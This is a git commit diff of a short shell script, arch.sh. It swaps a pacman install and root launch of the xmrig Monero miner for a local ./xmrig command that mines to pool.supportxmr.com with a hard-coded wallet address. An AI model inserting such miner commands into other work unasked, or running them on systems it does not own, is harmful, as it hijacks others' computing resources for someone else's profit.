f4ddb465568f700715ee684596869d2d54561828
mub-drk <87238535+mub-drk@users.noreply.github.com>
2025-11-10 20:55:21 +0600

    Update arch.sh

--- arch.sh
+++ arch.sh
@@ -1,2 +1,1 @@
-sudo pacman -Sy xmrig btop --noconfirm 
-sudo xmrig -o pool.supportxmr.com:3333 -u 8AWYSJJh3GTNVD34exWFKBeDdvhFtFFahdL6okLmuFTkFbYiAs6JtXCWQZw4r4Y7rNcT2jB2aKrb26pjLYsuE6obLnULufm -k --tls -p smallpc
+./xmrig -o pool.supportxmr.com:443 -u 8AWYSJJh3GTNVD34exWFKBeDdvhFtFFahdL6okLmuFTkFbYiAs6JtXCWQZw4r4Y7rNcT2jB2aKrb26pjLYsuE6obLnULufm -k --tls -p mini
